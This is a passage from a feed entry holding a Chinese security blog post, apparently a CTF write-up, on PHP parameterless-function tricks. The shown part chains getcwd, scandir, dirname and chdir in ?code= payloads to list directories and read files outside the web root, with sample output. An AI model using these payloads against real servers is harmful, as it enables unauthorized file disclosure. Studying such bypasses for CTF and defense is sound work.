chdir()"></a>法五：dirname() &amp; chdir()</h2><p>为什么一定要RCE呢？我们能不能直接读文件？<br>之前的方法都基于可以进行RCE，如果目标真的不能RCE呢？我们能不能进行任意读取？<br>那么想读文件，就必须进行目录遍历，没有参数，怎么进行目录遍历呢？<br>首先，我们可以利用<code>getcwd()</code>获取当前目录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?code=var_dump(getcwd());</span><br><span class="line"></span><br><span class="line">string(13) &quot;/var/www/html&quot;</span><br></pre></td></tr></table></figure></p><p>那么怎么进行当前目录的目录遍历呢？<br>这里用<code>scandir()</code>即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?code=var_dump(scandir(getcwd()));</span><br><span class="line"></span><br><span class="line">array(3) &#123; [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(9) &quot;index.php&quot; &#125;</span><br></pre></td></tr></table></figure></p><p>那么既然不在这一层目录，如何进行目录上跳呢？<br>我们用<code>dirname()</code>即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?code=var_dump(scandir(dirname(getcwd())));</span><br><span class="line"></span><br><span class="line">array(4) &#123; [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(14) &quot;flag_phpbyp4ss&quot; [3]=&gt; string(4) &quot;html&quot; &#125;</span><br></pre></td></tr></table></figure></p><p>那么怎么更改我们的当前目录呢？这里我们发现有函数可以更改当前目录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chdir ( string $directory ) : bool</span><br></pre></td></tr></table></figure></p><p>将 PHP 的当前目录改为 directory。<br>所以我们这里在<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirname(getcwd())</span><br></pre></td></tr></table></figure></p><p>进行如下设置即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chdir(dirname(getcwd()))</span><br></pre></td></tr></table></figure></p><p>我们尝试读取<code>/var/www/123</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/?code=readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd())))))));</span><br></pre></td></tr></table></figure></p><p>即可进行文件读取</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>php无参数函数RCE的方式有很多种，主要还是考察对php函数的熟练程度。我相信应该还有更多的方式没有挖掘出来，期待讨论。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文章首发于嘶吼</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;最近做了一些php 无参数函数执行的题目，这里做一个总结，以便以后bypass各种正则过滤。&lt;br&gt;大致思路如下：&lt;br&gt;1.利用超全局变量
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
</feed>
